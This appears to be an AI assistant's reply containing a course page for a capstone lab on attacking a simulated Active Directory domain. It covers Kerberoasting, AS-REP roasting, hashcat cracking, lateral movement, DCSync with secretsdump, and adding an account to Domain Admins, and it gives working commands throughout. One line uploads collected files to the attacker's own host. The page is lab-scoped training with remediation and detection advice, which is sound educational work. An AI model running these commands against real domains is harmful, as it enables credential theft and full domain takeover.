Understood — I restored the **[[🧭 Table of Contents]]** header exactly as you requested and put it **on its own line** after every section. I also re-added the emojis into the top Table of Contents so the links work, and preserved all the detailed steps, bash code blocks, and explanations exactly as before. Nothing was removed.

Below is the corrected Week 10 capstone page. Every section ends with a single line containing **[[🧭 Table of Contents]]** so your heading links remain intact and clickable. The top TOC includes emojis for each entry.

---

# 🧭 Table of Contents (Heading Links)

- [[# 1. Weekly Overview 🏢🔐]]
- [[# 2. Learning Objectives 🎯]]
- [[# 3. Required Reading (Workbooks) 📚]]
- [[# 4. Before You Start Environment and Artifact Checklist ✅]]
- [[# 5. Core Theory Kerberos LDAP ACLs and AD Attack Primitives 🔬]]
- [[# 6. Lab 1 AD Recon and Domain Enumeration Deep Walkthrough (2 hours) 🔎]]
- [[# 7. Lab 2 Credential Attacks Kerberoasting and AS‑REP Roasting Deep Walkthrough (3 hours) ⏱️]]
- [[# 8. Lab 3 Lateral Movement Deep Walkthrough (3 hours) ⚔️]]
- [[# 9. Lab 4 Privilege Escalation to Domain Admin Deep Walkthrough (3 hours) 🛠️]]
- [[# 10. Assignments Expectations and Grading Hints 🧾]]
- [[# 11. Mini‑Project Full AD Attack Chain Capstone 🧩]]
- [[# 12. Documentation and Reporting How to Record an AD Engagement 📝]]
- [[# 13. Troubleshooting and Common Pitfalls 🛠️]]
- [[# 14. Reflection Prompts 🤔]]
- [[# 15. Deliverables Checklist 📦]]

---

# 1. Weekly Overview 🏢🔐

Week 10 is the capstone of the syllabus: a single, sustained Active Directory simulation that requires you to synthesize everything you have learned across networking, web, system, and Windows exploitation into a coherent, auditable attack chain. The lab environment is intentionally realistic — it contains small misconfigurations, legacy service accounts, permissive ACLs, and the kinds of operational drift you will see in real enterprises. Your objective is not merely to demonstrate techniques, but to practice the discipline of **evidence collection**, **hypothesis testing**, and **safe, reversible actions**. You will begin by building a domain profile that lists domain controllers, service principal names, and high‑value accounts. From that map you will extract offline artifacts — Kerberos TGS blobs and AS‑REP responses — crack them with targeted strategies, and use the resulting credentials, hashes, or tickets to move laterally. The final stage is privilege escalation to Domain Admin using the path that your evidence supports: ACL abuse, replication APIs, GPO/SYSVOL write, or Kerberos‑derived credentials. Every claim in your final report must point to a saved artifact: an LDAP dump, a TGS file, a cracked hash, a WinRM transcript, a BloodHound graph, or a `secretsdump` output. 📁🔎

[[🧭 Table of Contents]]

---

# 2. Learning Objectives 🎯

By the end of Week 10 you will be able to read an Active Directory environment as a graph and convert that reading into action. You will enumerate AD using both unauthenticated and authenticated techniques, extract and interpret `servicePrincipalName` and `userAccountControl` attributes, and use those attributes to generate offline artifacts for cracking. You will understand the differences between AS‑REP roasting and Kerberoasting, and you will be able to choose cracking strategies that balance speed and coverage. You will use harvested credentials, NTLM hashes, and Kerberos tickets to move laterally via WinRM, SMB exec, WMI, and ticket injection, and you will stabilize and document each foothold. Finally, you will escalate to Domain Admin using the path justified by your artifacts — whether that path is a cracked privileged service account, an ACL that grants replication rights, or a writable GPO — and you will package the entire chain into a reproducible capstone that a reviewer can validate step by step. 🧭📜

[[🧭 Table of Contents]]

---

# 3. Required Reading (Workbooks) 📚

Before you begin the labs, read the AD Lab Workbook sections that define the lab topology, the directory schema you will encounter, and the allowed actions. The workbook’s Reconnaissance and Enumeration chapters explain how to extract LDAP attributes in a machine‑readable format and how to prepare data for BloodHound ingestion. The Credential Attacks chapter explains the exact formats produced by `GetUserSPNs.py` and `GetNPUsers.py` and how to feed those outputs to hashcat. The Lateral Movement and Privilege Escalation chapters describe the tradeoffs between PtH, PtT, Overpass‑the‑Hash, and DCSync, and they provide safe, reversible examples for GPO and ACL modifications in a lab. Finally, the Reporting chapter defines the artifact model you must follow: every claim must reference a single immutable artifact. Read these sections carefully; they are the blueprint for the capstone. Save short notes about any lab‑specific constraints (for example, whether anonymous LDAP binds are allowed or whether SYSVOL is writable) so you can adapt the walkthroughs to the environment you are given. 🗂️

[[🧭 Table of Contents]]

---

# 4. Before You Start Environment and Artifact Checklist ✅

Prepare your workspace and capture a minimal baseline. Active Directory testing is stateful and time‑sensitive: Kerberos will fail if clocks are out of sync, and missing artifacts will make your final report unreproducible. Create a single directory for the week and subfolders for scans, screenshots, pcaps, notes, and artifacts. Use ISO timestamps in filenames so reviewers can follow your timeline.

Run these commands to create the structure and capture the start time:

```bash
mkdir -p ~/week10/{scans,screenshots,pcaps,notes,artifacts}
cd ~/week10
date -u > scans/start_time.txt
```

Synchronize clocks on your Kali host and the lab VMs. Kerberos tolerates only small clock skew; if your clock is off, ticket requests will fail or produce confusing errors. On Kali, verify and sync time:

```bash
timedatectl status
sudo ntpdate -u pool.ntp.org
```

Run a focused port scan against the domain controller(s) to confirm which AD services are reachable. Use a narrow port list rather than a full port sweep to save time and reduce noise:

```bash
nmap -sS -p 88,135,139,389,445,464,636,3268,3269 -oN scans/dc_ports_$(date -u +"%Y%m%dT%H%M%SZ").txt <DC-IP>
```

Start a filtered packet capture that records only Kerberos, LDAP, and SMB traffic for the DC IP; this pcap will be your immutable network evidence for ticket requests and replication activity:

```bash
sudo tcpdump -i eth0 host <DC-IP> and \(port 88 or port 389 or port 445\) -w pcaps/ad_baseline_$(date -u +"%Y%m%dT%H%M%SZ").pcap
```

Prepare your toolset and record versions. The core tools you will use are Impacket (GetUserSPNs.py, GetNPUsers.py, secretsdump.py), CrackMapExec, BloodHound and its collectors, hashcat or John, Rubeus and Mimikatz for lab demonstrations, and remote execution tools such as Evil‑WinRM and Impacket’s `psexec.py`/`wmiexec.py`. Record the exact tool versions in `notes/tool_versions.md` so a reviewer knows the environment used to generate artifacts.

Finally, write a short `notes/rules_of_engagement.md` that states the lab scope and the reversible actions you will take. This file is part of your evidence model: it shows you planned to avoid destructive actions on DCs and to prefer replication APIs and reversible LDAP modifications. With this baseline in place you are ready to begin enumeration. 🛠️🔐

[[🧭 Table of Contents]]

---

# 5. Core Theory Kerberos LDAP ACLs and AD Attack Primitives 🔬

Before you run any commands, internalize the primitives you will exploit. Active Directory is not a set of isolated services; it is a graph of identities and relationships. The two most important protocols for offensive AD work are Kerberos and LDAP, and the two most important concepts are **offline artifacts** and **ACLs**.

Kerberos issues two ticket types that matter to attackers: the AS (TGT) and the TGS (service ticket). When a client requests a TGT, the KDC responds with an AS‑REP that is encrypted with the user’s key. If an account has Kerberos preauthentication disabled, the KDC will return an AS‑REP even without preauth; that AS‑REP contains material that can be brute‑forced offline to recover the user’s password. This is the AS‑REP roasting primitive. When a client requests a TGS for an SPN, the TGS is encrypted with the service account’s key; extracting that TGS and cracking it offline is Kerberoasting. Both attacks produce offline blobs that you can feed to hashcat or John for offline cracking, which is powerful because it reduces noise on the domain and yields reusable credentials.

LDAP is the protocol you use to read the directory and to convert raw attributes into graph edges. Attributes such as `servicePrincipalName` identify Kerberoast targets; `userAccountControl` flags reveal preauth settings; `memberOf` shows group membership; and ACLs on objects reveal rights such as `GenericAll`, `WriteDacl`, or `Replicating Directory Changes`. BloodHound ingests LDAP and session data and computes shortest paths to Domain Admin using edges like `AdminTo`, `HasSession`, and `AllowedToDelegateTo`. Understanding how to read an ACL and translate it into an action — for example, using an LDAP modify to add a member to a group when you have `WriteDacl` — is as important as cracking a password.

Finally, understand the tradeoffs of lateral techniques. Pass‑the‑Hash is quick and works where NTLM is accepted, but it is limited to hosts that accept NTLM. Pass‑the‑Ticket and golden tickets are powerful and can bypass many controls, but they require ticket material or `krbtgt` knowledge and are noisy if misused. Overpass‑the‑Hash requests Kerberos tickets using an NTLM hash and can be useful when Kerberos is enforced. DCSync via replication APIs is a clean way to obtain NTDS data if you have replication rights; it is auditable and does not require file system access to the DC. These primitives guide your decision making: choose the least noisy, most reliable path that your artifacts justify. 🧠🔗

[[🧭 Table of Contents]]

---

# 6. Lab 1 AD Recon and Domain Enumeration Deep Walkthrough (2 hours) 🔎

This lab is about building a reliable, evidence‑backed map of the domain that you will use for credential attacks and lateral movement. The walkthrough below is prescriptive: run the commands, save the outputs, and interpret them immediately so you know what to do next.

Begin with a focused port scan against the domain controller. Use `nmap` with a narrow port list to confirm which AD services are reachable. Save the output with an ISO timestamped filename. When the scan completes, read the results carefully: an open port 88 means Kerberos is reachable and you can request tickets; open ports 389 or 636 mean LDAP or LDAPS is reachable and you can query directory attributes; port 445 indicates SMB and potential access to SYSVOL or shares. If any expected ports are filtered, note that behavior and consider whether a firewall or proxy is present.

Run the scan and save the output:

```bash
nmap -sS -p 88,135,139,389,445,464,636,3268,3269 -oN scans/dc_ports_$(date -u +"%Y%m%dT%H%M%SZ").txt <DC-IP>
```

Next, attempt low‑impact probes. If the lab allows anonymous LDAP binds, run a simple `ldapsearch -x` against the base DN to enumerate user objects and save the raw output. If anonymous binds are not allowed, use any low‑privileged credentials you have to perform authenticated pulls. The goal is to extract structured data that you can feed into BloodHound and into scripts that will produce SPN lists. Use Impacket’s `GetADUsers.py` or `ldapsearch` to export user attributes in JSON or LDIF format. Immediately extract `servicePrincipalName` attributes into a separate file; each SPN is a Kerberoast candidate and should be treated as an artifact.

Example anonymous LDAP probe (only if allowed):

```bash
ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local" "(objectClass=user)" cn > scans/ldap_anon_users_$(date -u +"%Y%m%dT%H%M%SZ").ldif
```

If you have credentials, export structured user data for BloodHound ingestion:

```bash
python3 /usr/share/doc/impacket/examples/GetADUsers.py domain.local/user:Passw0rd -dc-ip <DC-IP> > scans/ad_users_$(date -u +"%Y%m%dT%H%M%SZ").json
```

After you have user and SPN data, run a BloodHound collector. In a Windows lab you would run SharpHound; from Kali you can use `bloodhound-python`. Collect `Session`, `LocalAdmin`, `SPN`, and `ACL` data and save the collector zip. Import the zip into BloodHound and run the shortest path queries to Domain Admin. Screenshot the top paths and save those screenshots. These graphs are not the final plan; they are hypotheses. Each edge in a BloodHound path must be justified by a saved artifact: an LDAP attribute, a session listing, or an ACL entry. Save the raw LDAP outputs that produced the BloodHound edges so a reviewer can verify the graph.

Example BloodHound collection (bloodhound-python):

```bash
bloodhound-python -u user -p 'Passw0rd' -d domain.local -ns <DC-IP> -c All -zipfile scans/sharp_hound_$(date -u +"%Y%m%dT%H%M%SZ").zip
```

Throughout the lab, maintain a `domain_profile.md` that lists the domain name, DC hostnames and IPs, the SPN inventory, and any high‑value accounts you identified. This profile is the map you will use for Kerberoasting and lateral movement. End the lab by compressing your scans and collector zip and noting the next steps: which SPNs to request tickets for and which accounts to test for preauth disabled.

```bash
zip -r artifacts_week10_$(date -u +"%Y%m%dT%H%M%SZ").zip scans/ screenshots/ pcaps/ notes/
```

Deliverables for Lab 1: the `nmap` output, SPN list, AD user export, BloodHound collector zip, BloodHound screenshots, and the `domain_profile.md`. These artifacts are the foundation for the credential attacks in Lab 2. 🗺️🧾

[[🧭 Table of Contents]]

---

# 7. Lab 2 Credential Attacks Kerberoasting and AS‑REP Roasting Deep Walkthrough (3 hours) ⏱️

This lab converts the SPN and user data you collected into offline artifacts that you can crack. The process is deliberate: identify targets, request tickets, extract hashes, and crack them with a strategy that balances speed and coverage.

Start with Kerberoasting. Use the SPN list you saved in Lab 1 and run Impacket’s `GetUserSPNs.py` with a low‑privileged account. The tool performs legitimate Kerberos TGS requests for each SPN and outputs the encrypted TGS material in a format that hashcat or John can consume. Save the raw output and the formatted hash file with an ISO timestamp. The output lines will include the service account name and the encrypted blob; treat that file as an immutable artifact.

Run the extraction:

```bash
python3 /usr/share/doc/impacket/examples/GetUserSPNs.py domain.local/user:Passw0rd -dc-ip <DC-IP> -outputfile scans/kerberoast_tgts_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

The file will contain lines in hashcat/john format such as:

```
$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/db01.domain.local:1433$...<hex>...
```

Save that file as `scans/kerberoast_hashes_YYYYMMDDTHHMMSSZ.txt`.

Cracking strategy matters. Kerberoast hashes are often RC4/etype 23 and are cracked with hashcat mode `13100`. Rather than throwing a massive wordlist at the hashes, start with targeted lists derived from the environment: service account naming patterns, company names, common suffixes, and small mutation rules. Use incremental rules to expand coverage. Run hashcat with status reporting and save the cracked results to a file. For example:

```bash
hashcat -m 13100 scans/kerberoast_hashes_YYYYMMDDTHHMMSSZ.txt /path/to/targeted_wordlist.txt -o scans/kerberoast_cracked_$(date -u +"%Y%m%dT%H%M%SZ").txt --status --status-timer=60
```

For each cracked credential, validate it by attempting a safe login to a non‑critical host or service and save the login transcript. Validation proves the cracked secret is usable and justifies the next lateral step. Example WinRM validation:

```bash
evil-winrm -i <TARGET-IP> -u svc_sql -p 'CrackedPass' | tee scans/evilwinrm_svc_sql_target_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

AS‑REP roasting follows a similar pattern but targets accounts with Kerberos preauthentication disabled. Use Impacket’s `GetNPUsers.py` with a username list derived from your LDAP export. The tool will request AS‑REPs and save those that are returned for accounts with `DONT_REQ_PREAUTH`. Crack those AS‑REP blobs with hashcat mode `18200`. Example extraction and cracking:

```bash
python3 /usr/share/doc/impacket/examples/GetNPUsers.py domain.local/ -dc-ip <DC-IP> -usersfile scans/users_$(date -u +"%Y%m%dT%H%M%SZ").txt -outputfile scans/asrep_hashes_$(date -u +"%Y%m%dT%H%M%SZ").txt

hashcat -m 18200 scans/asrep_hashes_YYYYMMDDTHHMMSSZ.txt /path/to/targeted_wordlist.txt -o scans/asrep_cracked_$(date -u +"%Y%m%dT%H%M%SZ").txt --status
```

When you crack a password, validate it by attempting a safe login (SMB or WinRM) and save the transcript. Document the exact commands you ran, the filenames produced, and the one‑line interpretation of each artifact. For example, record the `GetUserSPNs.py` command, the hash file path, the hashcat command and mode, and the cracked output path. In your Kerberoast report, include the SPN inventory, the extraction commands, the cracked results, and an impact analysis that explains what each cracked account can access and why it matters. If cracking yields no results, explain your strategy and the next steps you will take: broaden wordlists, try hybrid rules, or pivot to ACL abuse if BloodHound suggests it. 🧩🔐

[[🧭 Table of Contents]]

---

# 8. Lab 3 Lateral Movement Deep Walkthrough (3 hours) ⚔️

With credentials, hashes, or tickets in hand, the next stage is lateral movement. The goal is to use harvested artifacts to access additional hosts, gather more artifacts, and position yourself for domain escalation. Each lateral step must be recorded with a transcript and a one‑line interpretation.

Begin by choosing the least noisy, most reliable method available. If you have plaintext credentials and WinRM is enabled, `evil-winrm` provides a stable PowerShell session that is easy to capture and analyze. If you have only an NTLM hash, Pass‑the‑Hash with tools that accept `-H` or Impacket’s `psexec.py` with `-hashes` is appropriate. If you have ticket material, Pass‑the‑Ticket or Overpass‑the‑Hash may be the right choice. The key is to pick the method that your artifacts justify and that will produce reproducible evidence.

When you obtain a shell on a new host, stabilize it immediately and collect a short set of local artifacts: `whoami /all` to list privileges, `systeminfo` for OS and patch level, a list of services and their `ImagePath` values, scheduled tasks, and registry keys that may contain stored credentials. Save these outputs to files on the target and transfer them to your Kali host using a reversible method such as SMB pull or `Invoke‑WebRequest` to a controlled web server. Each transferred file is an artifact that supports later privilege escalation steps.

Example WinRM session and immediate enumeration:

```bash
evil-winrm -i <TARGET-IP> -u svc_sql -p 'CrackedPass' | tee scans/evilwinrm_svc_sql_target_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

On the target, run:

```powershell
whoami /all > C:\Users\Public\whoami_all.txt
systeminfo > C:\Users\Public\systeminfo.txt
wmic service get name,displayname,pathname,startmode,started > C:\Users\Public\services.txt
schtasks /query /fo LIST /v > C:\Users\Public\schtasks.txt
```

Transfer these files back to Kali using `smbclient` or a simple HTTP pull:

```powershell
# On target (PowerShell)
Invoke-WebRequest -Uri "http://<KALI-IP>:8000/upload" -Method PUT -InFile C:\Users\Public\whoami_all.txt
```

If you find additional SPNs or credentials on a host, return to the Kerberoast/AS‑REP workflow: request tickets, extract hashes, and crack them. If you obtain NTDS data or `krbtgt` material later, you will use those artifacts for golden tickets or DCSync, but only after you have documented the path that led to them.

For ticket attacks, document the ticket file, the injection command, and the resulting access. For Pass‑the‑Hash, record the hash file path and the exact command used to authenticate. For each lateral technique, record the target IP, the credential or ticket used (reference the artifact path, not the secret itself), the command executed, and the resulting evidence. This mapping becomes your lateral movement case study and will be a key part of the capstone. 🔁🧾

[[🧭 Table of Contents]]

---

# 9. Lab 4 Privilege Escalation to Domain Admin Deep Walkthrough (3 hours) 🛠️

The final lab converts footholds and lateral access into domain dominance. There are multiple escalation paths; choose the one justified by your artifacts and BloodHound analysis. The walkthrough below describes the common paths and the exact evidence you must collect.

If a cracked service account has `AdminTo` edges or membership in privileged groups, validate whether that account can access the DC or run privileged actions. If it can, use `secretsdump.py` with the account to request NTDS data via replication APIs. Save the `secretsdump` output; it will contain NT hashes for domain accounts and possibly the `krbtgt` hash. Document the exact `secretsdump` command and the output path. Example:

```bash
python3 /usr/share/doc/impacket/examples/secretsdump.py domain.local/svc_priv@<DC-IP> -just-dc > scans/secretsdump_svc_priv_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

If BloodHound shows ACL edges such as `GenericAll` or `WriteDacl` that your account can exploit, export the ACL evidence and craft an LDAP modify or PowerShell `Set‑ACL` operation that performs the minimal change required to escalate. For example, if you can add a member to `Domain Admins`, prepare an LDIF that adds your account and save that LDIF as an artifact. Apply the change only if the lab rules allow it, and save pre‑ and post‑state LDAP dumps so a reviewer can see the exact modification. Example LDIF (illustrative):

```ldif
dn: CN=Domain Admins,CN=Users,DC=domain,DC=local
changetype: modify
add: member
member: CN=attacker,CN=Users,DC=domain,DC=local
```

Apply with `ldapmodify` if permitted:

```bash
ldapmodify -x -D "svc_acluser@domain.local" -w 'Passw0rd' -f artifacts/add_attacker_to_domain_admins.ldif -H ldap://<DC-IP>
```

DCSync is the cleanest way to obtain domain secrets if you have replication rights or a privileged account. Use `secretsdump.py` with `-just-dc` to request NTDS data via the replication API; this avoids touching DC files and is auditable. Save the output and the account used. If you obtain DA hashes, demonstrate how they can be used to authenticate as DA and record the `whoami` evidence showing Domain Admin privileges.

If GPO or SYSVOL write is possible, document the GPO GUID and the exact file you add (for example, a startup script). Add the script only as a reversible proof that runs a benign action such as writing a proof file to `C:\Windows\Temp`. Capture the proof file creation and the GPO file path, then remove the script as part of cleanup. Example GPO write (lab only):

```bash
# Example: copy startup script to SYSVOL (only in lab)
smbclient //DC-IP/C$ -U 'svc_priv' -c "put artifacts/proof_startup.ps1 \"C:\\Windows\\SYSVOL\\domain\\Policies\\{GPO-GUID}\\Machine\\Scripts\\Startup\\proof_startup.ps1\""
```

For each escalation path, save pre/post BloodHound graphs, LDAP dumps, `secretsdump` outputs, and `whoami` evidence showing Domain Admin. Conclude the lab with a remediation checklist: rotate `krbtgt` if compromised, remove unnecessary replication rights, fix ACLs, enforce gMSAs and strong service account passwords, and monitor for anomalous TGS/AS‑REP requests and replication activity. 🏁🔐

[[🧭 Table of Contents]]

---

# 10. Assignments Expectations and Grading Hints 🧾

Your written deliverables must be evidence‑first and reproducible. The **Kerberoasting Report** should include the SPN inventory, the exact `GetUserSPNs.py` command you ran, the raw TGS file, the hashcat command and mode used, the cracked output, and the validation transcript showing the cracked credential works. Explain the impact of each cracked account: which hosts or services it can access and why that access matters. Provide remediation recommendations that are practical: use gMSAs, enforce strong service account passwords, monitor for unusual TGS requests, and restrict which accounts can request service tickets.

The **Lateral Movement Case Study** should document a single lateral path end‑to‑end. Start with the credential or ticket used, show the exact command used to access the target, include the transcript and any files read, and explain the impact. Provide remediation: restrict remote management, enable SMB signing, enforce least privilege for service accounts, and monitor lateral authentication patterns.

Grading will emphasize reproducibility. If a reviewer cannot reproduce your steps using your artifacts, points will be deducted. Include exact commands, file paths, timestamps, and a short reproduction note for each major step. Keep your artifacts organized and small, and include a README that explains how to validate a single step quickly. 📄✅

[[🧭 Table of Contents]]

---

# 11. Mini‑Project Full AD Attack Chain Capstone 🧩

Your capstone page `[[0610 AD Attack Chain]]` is the single artifact that ties everything together. Structure it as a reproducible narrative with the following sections: an executive summary that explains impact and prioritized remediation in two paragraphs; recon outputs and the domain profile; enumeration artifacts including LDAP dumps and the SPN list; credential attack artifacts including TGS and AS‑REP files and cracked outputs; lateral movement transcripts and host artifacts; privilege escalation artifacts such as LDIFs, `secretsdump` outputs, and BloodHound before/after screenshots; a reversible persistence demonstration; a safe data exfiltration simulation that copies a non‑sensitive test file and records the pcap; and a prioritized remediation and detection plan. Include a README that explains how to reproduce the chain from the artifacts and a manifest that lists every file with an ISO timestamp and the command used to create it. The capstone should let a reviewer verify each claim without additional scanning. 🧾🔁

[[🧭 Table of Contents]]

---

# 12. Documentation and Reporting How to Record an AD Engagement 📝

Record every action with an ISO timestamp, the exact command or request, the output file path, and a one‑line interpretation. Keep a manifest file that lists each artifact and the command that produced it. For example, a manifest line might read:

```
2026-06-10T14:05Z | GetUserSPNs.py domain.local/user:Passw0rd -dc-ip 10.0.0.10 -o scans/kerberoast_tgts.txt | Saved TGS hashes for offline cracking
```

Package artifacts into logical folders and compress large items such as BloodHound zips. Provide a short reproduction script or README that demonstrates how to validate a single step, for example how to verify a cracked credential logs in via WinRM using the saved transcript. Your executive summary should be two paragraphs: the first describing the impact and the path to compromise, the second listing prioritized remediation and detection recommendations. Include a short appendix that explains the lab rules and any deviations you made for demonstration purposes. Example executive summary:

> During a simulated engagement against `domain.local`, we enumerated AD services and discovered multiple service accounts with exposed SPNs and at least one account configured without Kerberos preauthentication. We extracted Kerberos service tickets and AS‑REPs, cracked weak credentials offline, and used those credentials to move laterally via WinRM and SMB. Using ACL abuse and DCSync techniques, we obtained NT hashes for domain accounts and demonstrated the ability to achieve Domain Admin privileges. Recommendations: enforce strong service account passwords and gMSAs, enable Kerberos preauthentication, audit and restrict replication/ACL rights, rotate `krbtgt` if compromised, and implement detection for anomalous TGS/AS‑REP requests and replication activity.

Save this as `notes/executive_summary.md` and include it in your capstone package. 📦

[[🧭 Table of Contents]]

---

# 13. Troubleshooting and Common Pitfalls 🛠️

Kerberoast and AS‑REP cracking can be slow; use targeted wordlists and rules derived from the environment rather than massive generic dictionaries. If `GetUserSPNs.py` returns no SPNs, verify your LDAP base DN and ensure you queried the correct domain. If WinRM connections fail, check whether the host expects HTTPS on 5986 or requires CredSSP; use `crackmapexec winrm` to enumerate supported auth methods. If BloodHound shows no short path to Domain Admin, look for indirect edges such as `WriteDacl` or `AddMember` that can be abused; ACL abuse often yields escalation where none is obvious. If DCSync fails, verify whether the account you used actually has replication rights; if not, search for ACLs that can grant those rights. Always save raw error outputs and the exact commands you used so you can reproduce and debug later. 🧰

[[🧭 Table of Contents]]

---

# 14. Reflection Prompts 🤔

After the capstone, write short answers in `notes/reflections.md` that convert practice into operational knowledge. Describe which enumeration step produced the most high‑value leads and why, which credential attack was most effective and why, where lateral movement stalled and how you could have pivoted faster, which PrivEsc technique would be hardest to remediate in a real enterprise, and which logging or SIEM rules would have detected your chain earlier. These reflections are essential: they turn a technical exercise into a set of prioritized, practical recommendations you can apply in real engagements. ✍️

[[🧭 Table of Contents]]

---

# 15. Deliverables Checklist 📦

At the end of the week, place the following in `~/week10/` and in your vault: the `scans/` folder with `nmap`, LDAP, `GetUserSPNs.py`, and `GetNPUsers.py` outputs; the `screenshots/` folder with BloodHound graphs and cracked results; the `pcaps/` folder with Kerberos/LDAP/SMB captures for key steps; the `artifacts/` folder with host artifacts and LDIF/PowerShell scripts used; and the `notes/` folder with the domain profile, Kerberoast report, lateral movement case study, privilege escalation chain, reflections, manifest, and the executive summary. Include the capstone page `[[0610 AD Attack Chain]]` with step‑by‑step reproduction instructions and remediation. Organize artifacts with ISO timestamps and include a README explaining reproduction steps so a reviewer can validate your work quickly. ✅

[[🧭 Table of Contents]]

---

If you want, I’ll now expand any single lab into a fully annotated, clickable walkthrough with exact expected outputs and annotated screenshots — for example, a step‑by‑step Kerberoast extraction → hashcat cracking → WinRM validation walkthrough that includes the exact `GetUserSPNs.py` output format, sample hash lines, recommended hashcat rules, and the expected `evil-winrm` transcript. Which lab or artifact should I expand first?